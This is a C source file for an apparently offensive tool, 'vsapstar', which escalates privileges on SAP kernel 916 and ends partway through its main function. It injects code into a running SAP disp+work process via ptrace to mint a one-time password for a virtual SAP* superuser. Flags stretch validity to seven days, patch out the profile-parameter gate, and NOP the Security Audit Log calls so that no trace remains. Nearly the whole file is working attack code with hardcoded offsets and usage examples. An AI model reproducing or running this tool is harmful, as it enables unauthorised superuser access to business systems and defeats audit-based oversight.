/*
 * vsapstar.c — SAP Virtual SAP* Privilege Escalation Tool
 * SAP kernel 916 | x86-64 Linux
 *
 * Technique: ptrace injection into the running disp+work process.
 *   1. Locate disp+work PID and binary path
 *   2. Resolve function addresses — ELF symbol table first (version-independent),
 *      fallback to hardcoded nm offsets for kernel 916 (ASLR handled via maps)
 *   3. Inject mmap(PROT_RWX) syscall into target → scratch page
 *   4. Write client data + output buffer into scratch page
 *   5. Call chosen function inside the target's context (VirtualUserHdl valid there)
 *   6. Read back the 40-char Base32 one-time password
 *
 * Two modes:
 *   Normal  — create_virtual_sapstar (purpose=2, validity 10-30 min)
 *             login/create_virtual_user_sapstar IS checked (server-side, purpose==2 only)
 *   --bypass — create_virtual_user_internal (default purpose=1, validity 0-10080 min)
 *             validity restriction removed (internal accepts 0-10080 min, e.g. 10080 = 7 days)
 *             login/create_virtual_user_sapstar is checked INSIDE create_virtual_user_internal
 *             itself whenever purpose==2 — calling internal directly with -P 2 does NOT
 *             skip this gate (CONFIRMED: --bypass -P 2 still enforces the profile param).
 *             For purpose=1 or 3, the gate is genuinely not checked, but those slots are
 *             only loginable via internal/trusted RFC auth types ('F','I','Y' at DyISign),
 *             not SAP GUI or external RFC SDK.
 *
 * --no-profile-check — one-byte patch (JE->JMP at NM_K916_PROFILE_CHECK_OFF) on the
 *             profile-param check inside create_virtual_user_internal. Forces the
 *             "allowed" branch unconditionally for purpose==2, ignoring
 *             login/create_virtual_user_sapstar entirely. CONFIRMED via decompile
 *             (binja, see disp+work.bndb): the check is
 *               call is_virtual_user_sapstar_disabled(); test al,al; je <allowed>
 *             Combine with -P 2 (--bypass -P 2, or normal mode) for a loginable
 *             (SAP GUI/RFC-usable) purpose=2 slot regardless of the profile param.
 *
 * --no-audit — suppresses the audit log independently of purpose/profile gate
 * and works in all modes.
 *
 * Build:
 *   gcc -O2 -o vsapstar vsapstar.c
 *
 * ASLR note: Handled — we parse /proc/pid/maps to get the runtime base each run.
 *
 * Version portability: ELF symbol lookup is tried first. If symbols are stripped,
 *   falls back to hardcoded offsets (kernel 916 only). Pass -e /path/to/disp+work
 *   to point at the right binary for symbol resolution.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>
#include <elf.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <signal.h>

/* ── Fallback offsets for SAP kernel 916 (used if ELF symbols unavailable) ── */
#define NM_K916_CREATE_SAPSTAR    0x00c7f70aUL  /* create_virtual_sapstar       */
#define NM_K916_CREATE_INTERNAL   0x00c7e392UL  /* create_virtual_user_internal */
#define NM_K916_ANCHOR            0x0077aa48UL  /* nlsui_main (T, our anchor)   */
/* whoami (int32): 0=Dispatcher, 1=DIA, 2=Btc, 9=DpMon.
 * VirtualUserHdl (ptr): NULL in dispatcher, non-NULL in initialized WPs.
 * We must inject into a DIA work process (whoami==1, VirtualUserHdl!=NULL). */
#define NM_K916_WHOAMI            0x064ad888UL  /* int32_t whoami               */
#define NM_K916_VIRT_USER_HDL     0x06613ab8UL  /* void* VirtualUserHdl         */

/* Audit log call sites inside create_virtual_user_internal (kernel 916).
 * Both are 5-byte `call rel32` instructions patched to NOP for --no-audit.
 *   SUCCESS:  fires after slot written + broadcast (arg: false = success)
 *   DISABLED: fires only when purpose==2 and login/create_virtual_user_sapstar=off
 */
#define NM_K916_AUDIT_SUCCESS   0x00c7ef6fUL
#define NM_K916_AUDIT_DISABLED  0x00c7e889UL

/* login/create_virtual_user_sapstar profile-param gate, inside
 * create_virtual_user_internal (kernel 916). For purpose==2 only:
 *   call is_virtual_user_sapstar_disabled()
 *   test al, al
 *   je   <allowed-path>     <-- byte 0x74 at this offset
 *   <fallthrough: param disabled -> audit "DISABLED" + return rc=8 (deny)>
 * Patching 0x74 (JE) -> 0xEB (JMP) makes the "allowed" branch unconditional,
 * i.e. ignores login/create_virtual_user_sapstar entirely for purpose==2.
 * Used by --no-profile-check. One-byte patch, restored after the call.
 *
 * Stored as an OFFSET FROM create_virtual_user_internal's entry point (not an
 * absolute nm address) so it stays correct when off_internal comes from ELF
 * symbol resolution on a binary build with a different link layout
 * (e.g. the -0x400000 delta build seen on vhcals4hci-class systems). */
#define NM_K916_PROFILE_CHECK_OFF (0x00c7e7d9UL - NM_K916_CREATE_INTERNAL)

/* ELF symbol names */
#define SYM_ANCHOR     "nlsui_main"
#define SYM_SAPSTAR    "create_virtual_sapstar"
#define SYM_INTERNAL   "_ZL28create_virtual_user_internalRA3_KDsN12SAP_KRN_SIGN20VIRTUAL_USER_PURPOSEEiRA40_Ds"
#define SYM_WHOAMI     "whoami"
#define SYM_VIRT_HDL   "_ZL14VirtualUserHdl"
#define SYM_AUDIT_LOG  "_ZL29virtual_user_audit_log_createPKDsN12SAP_KRN_SIGN20VIRTUAL_USER_PURPOSEEib"

#define PW_BUF_CHARS  40
#define RC_OK         0

/* ── ELF symbol resolution ───────────────────────────────────────────── */
/*
 * Resolve a symbol's nm-style address (relative to load base = 0) directly
 * from the ELF binary on disk. Works for both T (global) and t (local) symbols.
 * Returns 0 if not found.
 */
static uintptr_t elf_resolve_symbol(const char *binary_path, const char *sym_name) {
    int fd = open(binary_path, O_RDONLY);
    if (fd < 0) return 0;

    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return 0; }

    /* Read ELF header */
    Elf64_Ehdr ehdr;
    if (pread(fd, &ehdr, sizeof(ehdr), 0) != sizeof(ehdr)) { close(fd); return 0; }
    if (memcmp(ehdr.e_ident, ELFMAG, 4) != 0) { close(fd); return 0; }

    /* Walk section headers looking for SHT_SYMTAB then SHT_DYNSYM */
    uint32_t shtype_priority[] = { SHT_SYMTAB, SHT_DYNSYM, 0 };
    uintptr_t result = 0;

    for (int pass = 0; shtype_priority[pass] && !result; pass++) {
        uint32_t want_type = shtype_priority[pass];

        for (int i = 0; i < ehdr.e_shnum && !result; i++) {
            Elf64_Shdr shdr;
            off_t sh_off = ehdr.e_shoff + (off_t)i * ehdr.e_shentsize;
            if (pread(fd, &shdr, sizeof(shdr), sh_off) != sizeof(shdr)) continue;
            if (shdr.sh_type != want_type) continue;

            /* Found a symbol table section; get its string table */
            Elf64_Shdr strhdr;
            off_t str_off = ehdr.e_shoff + (off_t)shdr.sh_link * ehdr.e_shentsize;
            if (pread(fd, &strhdr, sizeof(strhdr), str_off) != sizeof(strhdr)) continue;

            /* Read string table */
            char *strtab = malloc(strhdr.sh_size);
            if (!strtab) continue;
            if (pread(fd, strtab, strhdr.sh_size, strhdr.sh_offset) != (ssize_t)strhdr.sh_size) {
                free(strtab); continue;
            }

            /* Scan symbols */
            size_t nsyms = shdr.sh_size / sizeof(Elf64_Sym);
            for (size_t j = 0; j < nsyms && !result; j++) {
                Elf64_Sym sym;
                off_t sym_off = shdr.sh_offset + (off_t)j * sizeof(sym);
                if (pread(fd, &sym, sizeof(sym), sym_off) != sizeof(sym)) continue;
                if (sym.st_value == 0) continue;
                if (sym.st_name >= strhdr.sh_size) continue;
                if (strcmp(strtab + sym.st_name, sym_name) == 0) {
                    result = (uintptr_t)sym.st_value;
                }
            }
            free(strtab);
        }
    }
    close(fd);
    return result;
}

/* ── Find all disp+work PIDs ──────────────────────────────────────────── */
#define MAX_PIDS 64
static int find_all_disp_work(const char *hint,
                               pid_t pids[MAX_PIDS], char exe_out[512]) {
    DIR *d = opendir("/proc");
    if (!d) { perror("opendir /proc"); return 0; }
    int n = 0;
    struct dirent *e;
    while ((e = readdir(d)) != NULL && n < MAX_PIDS) {
        if (!e->d_name[0] || e->d_name[0] < '1') continue;
        char link[256]; char resolved[512] = {0};
        snprintf(link, sizeof(link), "/proc/%s/exe", e->d_name);
        if (readlink(link, resolved, sizeof(resolved)-1) < 0) continue;
        const char *base = strrchr(resolved, '/');
        if (!base || strcmp(base+1, "disp+work") != 0) continue;
        if (hint && !strstr(resolved, hint)) continue;
        pids[n++] = (pid_t)atoi(e->d_name);
        if (n == 1 && exe_out) snprintf(exe_out, 512, "%s", resolved);
    }
    closedir(d);
    return n;
}

/* forward declaration needed by select_work_process */
static uintptr_t get_exe_base(pid_t pid);

/* ── Read a 32-bit or 64-bit value from a running process ───────────── */
static uint64_t read_remote_uint64(pid_t pid, uintptr_t addr) {
    uint64_t val = 0;
    struct iovec l = { &val, sizeof(val) }, r = { (void*)addr, sizeof(val) };
    if (process_vm_readv(pid, &l, 1, &r, 1, 0) != sizeof(val)) return (uint64_t)-1;
    return val;
}
static uint32_t read_remote_uint32(pid_t pid, uintptr_t addr) {
    uint32_t val = 0;
    struct iovec l = { &val, sizeof(val) }, r = { (void*)addr, sizeof(val) };
    if (process_vm_readv(pid, &l, 1, &r, 1, 0) != sizeof(val)) return (uint32_t)-1;
    return val;
}

/*
 * Select the best disp+work PID for injection:
 *   - Requires VirtualUserHdl != NULL  (uninitialized in dispatcher)
 *   - Prefers whoami == 1  (Dialog Work Process)
 * Falls back to any process with VirtualUserHdl != NULL if no DIA found.
 */
static pid_t select_work_process(pid_t *pids, int n, uintptr_t base,
                                  uintptr_t off_whoami, uintptr_t off_vhdl,
                                  int quiet) {
    pid_t best = 0;
    int   best_dia = 0;

    for (int i = 0; i < n; i++) {
        uintptr_t b = get_exe_base(pids[i]);
        if (!b) continue;
        uintptr_t vhdl_addr    = b + off_vhdl;
        uintptr_t whoami_addr  = b + off_whoami;
        uint64_t  vhdl         = read_remote_uint64(pids[i], vhdl_addr);
        uint32_t  wami         = read_remote_uint32(pids[i], whoami_addr);
        int       is_dia       = (wami == 1);
        if (!quiet)
            printf("[*] PID %-6d  whoami=%-2u  VirtualUserHdl=%s\n",
                   pids[i], wami, vhdl ? "initialized" : "NULL");
        if (vhdl == 0 || vhdl == (uint64_t)-1) continue;  /* skip dispatcher/uninit */
        if (!best || (is_dia && !best_dia)) {
            best     = pids[i];
            best_dia = is_dia;
        }
    }
    return best;
}

/* ── Get text segment base from /proc/pid/maps ───────────────────────── */
static uintptr_t get_exe_base(pid_t pid) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *f = fopen(path, "r");
    if (!f) { perror("fopen maps"); return 0; }
    char line[512]; uintptr_t base = 0;
    while (fgets(line, sizeof(line), f)) {
        uintptr_t start; char perms[8], pathname[256] = {0};
        sscanf(line, "%lx-%*x %s %*s %*s %*s %255s", &start, perms, pathname);
        if (strchr(perms, 'x') && strstr(pathname, "disp+work")) { base = start; break; }
    }
    fclose(f);
    return base;
}

/* ── Process memory I/O ──────────────────────────────────────────────── */
/*
 * mem_write_rw:  write to writable (data/stack/heap) pages — uses process_vm_writev.
 * mem_write_text: write to text (r-x) pages — uses PTRACE_POKETEXT which bypasses
 *                 page permissions. process_vm_writev would silently fail on r-x pages.
 * mem_read:       works on any mapped page.
 */
static int mem_write_rw(pid_t pid, uintptr_t addr, const void *data, size_t len) {
    struct iovec l = { (void*)data, len }, r = { (void*)addr, len };
    return process_vm_writev(pid, &l, 1, &r, 1, 0) == (ssize_t)len ? 0 : -1;
}
static int mem_read(pid_t pid, uintptr_t addr, void *buf, size_t len) {
    struct iovec l = { buf, len }, r = { (void*)addr, len };
    return process_vm_readv(pid, &l, 1, &r, 1, 0) == (ssize_t)len ? 0 : -1;
}
/* Write up to 8 bytes into a (possibly read-only) text page via PTRACE_POKETEXT.
 * Reads the aligned 8-byte word first, patches the relevant bytes, writes back. */
static int poke_text(pid_t pid, uintptr_t addr, const void *data, size_t len) {
    uintptr_t aligned = addr & ~7UL;
    size_t     off    = addr - aligned;
    long orig = ptrace(PTRACE_PEEKTEXT, pid, aligned, 0);
    if (orig == -1 && errno) return -1;
    uint8_t word[8];
    memcpy(word, &orig, 8);
    memcpy(word + off, data, len);
    long patched; memcpy(&patched, word, 8);
    return ptrace(PTRACE_POKETEXT, pid, aligned, patched) == 0 ? 0 : -1;
}
static int peek_text(pid_t pid, uintptr_t addr, void *buf, size_t len) {
    uintptr_t aligned = addr & ~7UL;
    size_t     off    = addr - aligned;
    long orig = ptrace(PTRACE_PEEKTEXT, pid, aligned, 0);
    if (orig == -1 && errno) return -1;
    uint8_t word[8]; memcpy(word, &orig, 8);
    memcpy(buf, word + off, len);
    return 0;
}

/* Multi-word variants — handle writes/reads that span 8-byte boundaries. */
static int poke_text_n(pid_t pid, uintptr_t addr, const void *data, size_t len) {
    const uint8_t *p = data;
    while (len > 0) {
        size_t off   = addr & 7UL;
        size_t chunk = 8 - off;
        if (chunk > len) chunk = len;
        if (poke_text(pid, addr, p, chunk) < 0) return -1;
        addr += chunk; p += chunk; len -= chunk;
    }
    return 0;
}
static int peek_text_n(pid_t pid, uintptr_t addr, void *buf, size_t len) {
    uint8_t *p = buf;
    while (len > 0) {
        size_t off   = addr & 7UL;
        size_t chunk = 8 - off;
        if (chunk > len) chunk = len;
        if (peek_text(pid, addr, p, chunk) < 0) return -1;
        addr += chunk; p += chunk; len -= chunk;
    }
    return 0;
}

/* ── Inject a raw syscall into target, return rax ────────────────────── */
/*
 * Patches 3 bytes at 'site' in the text section using PTRACE_POKETEXT
 * (bypasses r-x page permissions — process_vm_writev would fail silently).
 * Restores original bytes after the syscall completes.
 */
static long inject_syscall(pid_t pid, struct user_regs_struct *saved,
                            uintptr_t site, long nr,
                            long a1, long a2, long a3, long a4, long a5, long a6) {
    uint8_t orig[3], patch[3] = { 0x0f, 0x05, 0xcc };  /* syscall; int3 */
    if (peek_text(pid, site, orig, 3) < 0) return -1;
    if (poke_text(pid, site, patch, 3) < 0) return -1;

    struct user_regs_struct r = *saved;
    r.rip = site; r.rax = (unsigned long long)nr;
    r.rdi = (unsigned long long)a1; r.rsi = (unsigned long long)a2;
    r.rdx = (unsigned long long)a3; r.r10 = (unsigned long long)a4;
    r.r8  = (unsigned long long)a5; r.r9  = (unsigned long long)a6;
    ptrace(PTRACE_SETREGS, pid, 0, &r);
    ptrace(PTRACE_CONT, pid, 0, 0);
    waitpid(pid, NULL, 0);

    struct user_regs_struct res;
    ptrace(PTRACE_GETREGS, pid, 0, &res);
    poke_text(pid, site, orig, 3);  /* restore — also uses PTRACE_POKETEXT */
    return (long)res.rax;
}

/* ── Find a syscall instruction (0f 05) in target text ──────────────── */
static uintptr_t find_syscall_site(pid_t pid, uintptr_t base, size_t scan) {
    uint8_t buf[4096];
    for (size_t off = 0; off < scan; off += sizeof(buf)) {
        size_t n = (off + sizeof(buf) > scan) ? (scan - off) : sizeof(buf);
        if (mem_read(pid, base + off, buf, n) < 0) continue;
        for (size_t i = 0; i + 1 < n; i++)
            if (buf[i] == 0x0f && buf[i+1] == 0x05) return base + off + i;
    }
    return 0;
}

/* ── Call a function in the target via ptrace ────────────────────────── */
/*
 * rip=fn, rdi=a1, rsi=a2, rdx=a3, rcx=a4.
 *
 * Return trap: INT3 planted in text using PTRACE_POKETEXT (not in data page
 * — data/stack is PROT_RW only, non-executable, so INT3 there won't trigger).
 * We pick `trap_site` = first byte of the function itself, saved and restored.
 * We plant INT3 there, run the function, stop on INT3 when function returns
 * and jumps to trap_site, read rax, restore.
 *
 * Wait — actually we can't put the return trap AT the function start (it gets
 * overwritten and never reached on normal return). We need the INT3 at a
 * DIFFERENT text address that the function will return TO via `ret`.
 *
 * Approach: find a safe "cold" byte in text just after the function, plant INT3
 * there as the return address. The function's `ret` pops [rsp] = &trap_in_text
 * and jumps to it, hitting INT3.
 *
 * Simpler: use the syscall_site itself as the return trap — the site is known-good
 * text, already has a `syscall` byte (0f 05). We patch byte 0 to INT3 temporarily.
 *
 * Stack: fresh 1 MB R/W allocation, far from the target's live stack.
 */
#define SCRATCH_SIZE 0x100000  /* 1 MB — 64KB wasn't enough, function's stack frame overruns it */

static int call_in_target(pid_t pid, struct user_regs_struct *saved,
                           uintptr_t scratch_rw,  /* R/W data+stack page */
                           uintptr_t trap_site,   /* text location for INT3 trap */
                           uintptr_t fn,
                           uintptr_t a1, uintptr_t a2, long a3, long a4,
                           int singlestep, uintptr_t base) {
    /* Plant INT3 at trap_site in text (PTRACE_POKETEXT bypasses r-x perms) */
    uint8_t trap_orig[1];
    uint8_t trap_byte[1] = { 0xcc };
    if (peek_text(pid, trap_site, trap_orig, 1) < 0) return -1;
    if (poke_text(pid, trap_site, trap_byte, 1) < 0) return -1;

    struct user_regs_struct r = *saved;
    r.rip = fn;
    r.rdi = a1; r.rsi = a2;
    r.rdx = (unsigned long long)a3; r.rcx = (unsigned long long)a4;

    /*
     * Build fresh stack near the top of the R/W scratch region.
     * System V AMD64 ABI at function entry: rsp = 16n-8 (return addr at [rsp]).
     */
    uintptr_t stack_top = scratch_rw + SCRATCH_SIZE - 16;
    stack_top &= ~0xfUL;   /* align to 16 */
    stack_top -= 8;         /* rsp = 16n-8 on function entry */
    r.rsp = stack_top;

    /* Return address → trap_site (INT3 in text) */
    uintptr_t ret_addr = trap_site;
    mem_write_rw(pid, r.rsp, &ret_addr, 8);

    ptrace(PTRACE_SETREGS, pid, 0, &r);

    int ws;
    if (singlestep) {
        /* Ring buffer of the last steps' RIP + key registers, for diagnosing
         * where execution goes off the rails (e.g. a wild call/jmp into
         * unrelated code via a bad pointer in a register). */
        #define SS_RING 32
        struct { uintptr_t rip, rax, rdi, rsi, r9, rbx; } ring[SS_RING] = {{0}};
        int n = 0;
        long max_steps = 200000;
        for (long step = 0; step < max_steps; step++) {
            ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
            waitpid(pid, &ws, 0);
            if (!WIFSTOPPED(ws)) {
                fprintf(stderr, "[singlestep] target exited/signalled at step %ld (ws=0x%x)\n", step, ws);
                break;
            }
            struct user_regs_struct sr;
            ptrace(PTRACE_GETREGS, pid, 0, &sr);
            ring[n % SS_RING] = (typeof(ring[0])){
                .rip = sr.rip, .rax = sr.rax, .rdi = sr.rdi,
                .rsi = sr.rsi, .r9 = sr.r9, .rbx = sr.rbx
            };
            n++;
            int ssig = WSTOPSIG(ws);
            if (ssig != SIGTRAP) {
                fprintf(stderr, "[singlestep] stopped at step %ld: signal=%d (%s), rip=0x%llx, rax=0x%llx\n",
                        step, ssig, strsignal(ssig), sr.rip, sr.rax);

                /* Fault diagnostics: is rax itself an unmapped pointer, or a
                 * valid object pointer one dereference short of a vtable? Also
                 * snapshot the two "context" globals seen in the healthy trace
                 * (base+0x70AF900 and base+0x70AF728) for before/after compare. */
                errno = 0;
                long rax_deref = ptrace(PTRACE_PEEKTEXT, pid, (void*)sr.rax, 0);
                int rax_err = errno;
                fprintf(stderr, "[singlestep] [rax]=0x%lx (peek %s%s)\n",
                        (unsigned long)rax_deref,
                        rax_err ? "FAILED: " : "ok",
                        rax_err ? strerror(rax_err) : "");

                /* Dump the "this" object (rax) and its vtable ([rax]) fields,
                 * same layout as memdump's healthy global1 dump, to find where
                 * the expected vtable slot falls off mapped memory. */
                fprintf(stderr, "[singlestep] object @ rax=0x%llx:\n", sr.rax);
                for (int i = 0; i < 8; i++) {
                    errno = 0;
                    long v = ptrace(PTRACE_PEEKTEXT, pid, (void*)(sr.rax + i*8), 0);
                    if (errno) {
                        fprintf(stderr, "  +0x%02x: PEEK FAILED: %s\n", i*8, strerror(errno));
                    } else {
                        fprintf(stderr, "  +0x%02x: 0x%016lx\n", i*8, (unsigned long)v);
                    }
                }
                if (!rax_err && rax_deref > 0x1000) {
                    fprintf(stderr, "[singlestep] vtable @ [rax]=0x%lx:\n", (unsigned long)rax_deref);
                    for (int i = 0; i < 16; i++) {
                        errno = 0;
                        long v = ptrace(PTRACE_PEEKTEXT, pid, (void*)((uintptr_t)rax_deref + i*8), 0);
                        if (errno) {
                            fprintf(stderr, "  +0x%02x: PEEK FAILED: %s\n", i*8, strerror(errno));
                        } else {
                            fprintf(stderr, "  +0x%02x: 0x%016lx\n", i*8, (unsigned long)v);
                        }
                    }
                }

                uintptr_t g1 = base + 0x70AF900;
                uintptr_t g2 = base + 0x70AF728;
                errno = 0;
                long g1v = ptrace(PTRACE_PEEKTEXT, pid, (void*)g1, 0);
                fprintf(stderr, "[singlestep] global1 (0x70AF900) = 0x%lx%s\n",
                        (unsigned long)g1v, errno ? " (peek FAILED)" : "");
                errno = 0;
                long g2v = ptrace(PTRACE_PEEKTEXT, pid, (void*)g2, 0);
                fprintf(stderr, "[singlestep] global2 (0x70AF728) = 0x%lx%s\n",
                        (unsigned long)g2v, errno ? " (peek FAILED)" : "");
                break;
            }
            if (sr.rip == trap_site) {
                fprintf(stderr, "[singlestep] reached trap_site after %ld steps\n", step);
                break;
            }
            if (step > 0 && step % 5000 == 0) {
                fprintf(stderr, "[singlestep] step %ld: rip=0x%llx\n", step, sr.rip);
            }
        }
        int count = n < SS_RING ? n : SS_RING;
        int start = n < SS_RING ? 0 : (n % SS_RING);
        fprintf(stderr, "[singlestep] last %d steps (oldest first, of %d total):\n", count, n);
        for (int k = 0; k < count; k++) {
            int idx = (start + k) % SS_RING;
            fprintf(stderr, "  [step %d] rip=0x%lx rax=0x%lx rdi=0x%lx rsi=0x%lx r9=0x%lx rbx=0x%lx\n",
                    n - count + k, ring[idx].rip, ring[idx].rax, ring[idx].rdi,
                    ring[idx].rsi, ring[idx].r9, ring[idx].rbx);
        }
    } else {
        ptrace(PTRACE_CONT, pid, 0, 0);
        waitpid(pid, &ws, 0);
    }
    /* Restore INT3 site regardless of how we stopped */
    poke_text(pid, trap_site, trap_orig, 1);

    if (!WIFSTOPPED(ws)) {
        fprintf(stderr, "[debug] target did not stop via signal (ws=0x%x, "
                "exited=%d status=%d)\n", ws, WIFEXITED(ws), WIFEXITED(ws)?WEXITSTATUS(ws):-1);
        return -1;
    }

    struct user_regs_struct res;
    ptrace(PTRACE_GETREGS, pid, 0, &res);

    int sig = WSTOPSIG(ws);
    /* RIP after INT3 should be trap_site+1. Anything else means the call
     * didn't return cleanly to our trap (crash, wrong epilogue, etc.) */
    if (sig != SIGTRAP || res.rip != trap_site + 1) {
        fprintf(stderr,
            "[debug] unexpected stop: signal=%d (%s), rip=0x%llx "
            "(expected trap_site+1=0x%lx), rax=0x%llx rsp=0x%llx\n",
            sig, strsignal(sig), res.rip, trap_site + 1,
            res.rax, res.rsp);
    }
    return (int)(int32_t)res.rax;
}

/* ── UTF-16 helpers ──────────────────────────────────────────────────── */
static void to_utf16(const char *s, uint16_t *d, size_t n) {
    for (size_t i = 0; i < n && s[i]; i++) d[i] = (uint16_t)(unsigned char)s[i];
}
static void from_utf16(const uint16_t *s, char *d, size_t n) {
    size_t i;
    for (i = 0; i < n; i++) d[i] = (s[i] < 0x80) ? (char)s[i] : '?';
    while (i > 0 && d[i-1] == ' ') i--;
    d[i] = '\0';
}

/* ── Usage ───────────────────────────────────────────────────────────── */
static void usage(const char *p) {
    fprintf(stderr,
"vsapstar — SAP Virtual SAP* Privilege Escalation Tool\n"
"Kernel: 916 (ELF symbols preferred, nm offsets as fallback)\n\n"
"Usage: %s [options]\n\n"
"Options:\n"
"  -c <client>    3-digit SAP client  (default: 000)\n"
"  -v <minutes>   Validity window     (default: 10)\n"
"  --bypass       Call create_virtual_user_internal with purpose=1\n"
"                   Bypasses login/create_virtual_user_sapstar (purpose-2-only gate)\n"
"                   Removes 10-30 min restriction (internal accepts 0-10080 min)\n"
"  --no-audit     Suppress the SAP Security Audit Log (EUP/CREATE) entry\n"
"                   NOPs virtual_user_audit_log_create call sites before invoke,\n"
"                   restores them immediately after — no trace left in SM20/RSAU\n"
"  --no-profile-check  Ignore login/create_virtual_user_sapstar for purpose==2\n"
"                   One-byte patch (JE->JMP) on the profile-param check inside\n"
"                   create_virtual_user_internal; restored immediately after.\n"
"                   Combine with -P 2 (or normal mode) for a loginable slot\n"
"                   regardless of the profile parameter's value.\n"
"  -P <1|2|3>     Override purpose in bypass mode (default with --bypass: 1)\n"
"  -e <path>      Path to disp+work binary for symbol resolution\n"
"  -p <hint>      Substring to filter disp+work exe path (multi-SID hosts)\n"
"  --pid <pid>    Target this PID directly, skipping the work-process scan\n"
"  --singlestep   Diagnostic: single-step the injected call, print last 32\n"
"                 RIPs leading up to a crash/trap (max 5000 steps)\n"
"  -q             Quiet — print only the 40-char password\n\n"
"Examples:\n"
"  %s -c 100 -v 10                              # standard, 10 min\n"
"  %s -c 100 -v 10 --no-audit                   # standard, no audit log entry\n"
"  %s -c 100 -v 10080 --bypass --no-audit       # 7 days, no audit log\n"
"  %s -c 100 -v 10080 --bypass -P 2 --no-audit  # 7 days, purpose 2, no audit\n"
"  %s -c 100 -v 10080 --bypass -P 2 --no-audit --no-profile-check\n"
"                                                # 7 days, purpose 2, no audit,\n"
"                                                # login/create_virtual_user_sapstar ignored\n"
"  %s -c 100 -q                                 # password only to stdout\n\n"
"ASLR: handled — base resolved from /proc/pid/maps each run.\n"
"Portability: ELF symbol table used when available (any kernel version);\n"
"             falls back to hardcoded offsets for kernel 916 stripped binaries.\n",
    p, p, p, p, p, p, p);
    exit(1);
}

/* ── main ────────────────────────────────────────────────────────────── */
int main(int argc, char *argv[]) {
    const char *client = "000";
    int  validity      = 10;
    int  bypass        = 0;
    int  purpose       = -1;   /* -1 = auto: 2 for normal, 1 for bypass */
    int  quiet         = 0;
    int  no_audit      = 0;
    int  no_profile_check = 0;
    const char *hint   = NULL;
    const char *elf_path = NULL;
    pid_t pid_override = 0;
    int  singlestep    = 0;

    for (int i = 1; i < argc; i++) {
        if      (!strcmp(argv[i],"-c") && i+1<argc) { client   = argv[++i]; }
        else if (!strcmp(argv[i],"-v") && i+1<argc) { validity = atoi(argv[++i]); }
        else if (!strcmp(argv[i],"-P") && i+1<argc) { purpose  = atoi(argv[++i]); }
        else if (!strcmp(argv[i],"-e") && i+1<argc) { elf_path = argv[++i]; }
        else if (!strcmp(argv[i],"-p") && i+1<argc) { hint     = argv[++i]; }
        else if (!strcmp(argv[i],"--pid") && i+1<argc) { pid_override = (pid_t)atoi(argv[++i]); }
        else if (!strcmp(argv[i],"--singlestep"))    { singlestep = 1; }
        else if (!strcmp(argv[i],"--bypass"))        { bypass    = 1; }
        else if (!strcmp(argv[i],"--no-audit"))      { no_audit  = 1; }
        else if (!strcmp(argv[i],"--no-profile-check")) { no_profile_check = 1; }
        else if (!strcmp(argv[i],"-q"))              { quiet     = 1; }
        else if (!strcmp(argv[i],"-h"))              { usage(argv[0]); }
        else { fprintf(stderr,"Unknown: %s\n",argv[i]); usage(argv[0]); }
    }

    if (strlen(client) != 3) {
        fprintf(stderr, "[-] Client must be exactly 3 digits\n"); return 1;
    }
    if (!bypass && (validity < 10 || validity > 30)) {
        fprintf(stderr, "[-] Validity must be 10-30 without --bypass. "
                        "Use --bypass for extended range.\n"); return 1;
    }
    if (purpose < 0) purpose = bypass ? 1 : 2;

    /* ── Enumerate all disp+work processes ──────────────────────────────── */
    pid_t pids[MAX_PIDS]; char exe_path[512] = {0};
    int npids = find_all_disp_work(hint, pids, exe_path);
    if (!npids) {
        fprintf(stderr, "[-] No disp+work process found — run as <sid>adm\n"); return 1;
    }
    if (!elf_path) elf_path = exe_path;

    /* ── Resolve symbols from ELF (version-independent) ─────────────── */
    uintptr_t off_anchor   = elf_resolve_symbol(elf_path, SYM_ANCHOR);
    uintptr_t off_sapstar  = elf_resolve_symbol(elf_path, SYM_SAPSTAR);
    uintptr_t off_internal = elf_resolve_symbol(elf_path, SYM_INTERNAL);
    uintptr_t off_whoami   = elf_resolve_symbol(elf_path, SYM_WHOAMI);
    uintptr_t off_vhdl     = elf_resolve_symbol(elf_path, SYM_VIRT_HDL);
    uintptr_t off_audit    = elf_resolve_symbol(elf_path, SYM_AUDIT_LOG);

    if (off_anchor && off_sapstar && off_internal) {
        if (!quiet) printf("[*] Symbols resolved from ELF\n");
    } else {
        if (!quiet) printf("[!] ELF symbols not found — using kernel 916 offsets\n");
        off_anchor   = NM_K916_ANCHOR;
        off_sapstar  = NM_K916_CREATE_SAPSTAR;
        off_internal = NM_K916_CREATE_INTERNAL;
        off_whoami   = NM_K916_WHOAMI;
        off_vhdl     = NM_K916_VIRT_USER_HDL;
        off_audit    = 0;  /* use hardcoded call-site offsets below */
    }

    /*
     * Select the right process:
     *   - Dispatcher has whoami=0, VirtualUserHdl=NULL → will return INTERNAL_ERR
     *   - Dialog Work Process has whoami=1, VirtualUserHdl initialized → correct target
     *
     * We enumerate all disp+work PIDs, read whoami and VirtualUserHdl from each,
     * and pick a DIA work process (whoami=1) with initialized VirtualUserHdl.
     */
    pid_t pid;
    if (pid_override) {
        pid = pid_override;
        if (!quiet) printf("[*] --pid given, skipping scan, targeting PID %d directly\n", pid);
    } else {
        if (!quiet) printf("[*] Scanning %d disp+work process(es) for work process...\n", npids);
        /* Use any base temporarily for initial scan — each PID has its own base */
        pid = select_work_process(pids, npids, 0, off_whoami, off_vhdl, quiet);
        if (!pid) {
            fprintf(stderr, "[-] No initialized Dialog Work Process found.\n");
            fprintf(stderr, "    All VirtualUserHdl == NULL. Is SAP fully started?\n");
            fprintf(stderr, "    Tip: 'ps aux | grep disp+work' to list all WP PIDs.\n");
            return 1;
        }
    }

    uintptr_t base = get_exe_base(pid);
    if (!base) { fprintf(stderr,"[-] Cannot read /proc/%d/maps\n",pid); return 1; }
    if (!quiet) printf("[*] Using PID %d  base: 0x%lx  exe: %s\n", pid, base, exe_path);

    uintptr_t fn_sapstar  = base + off_sapstar;
    uintptr_t fn_internal = base + off_internal;
    uintptr_t fn_target   = bypass ? fn_internal : fn_sapstar;

    if (!quiet)
        printf("[*] %s @ 0x%lx (purpose=%d, validity=%d min)\n",
               bypass ? "create_virtual_user_internal" : "create_virtual_sapstar",
               fn_target, purpose, validity);

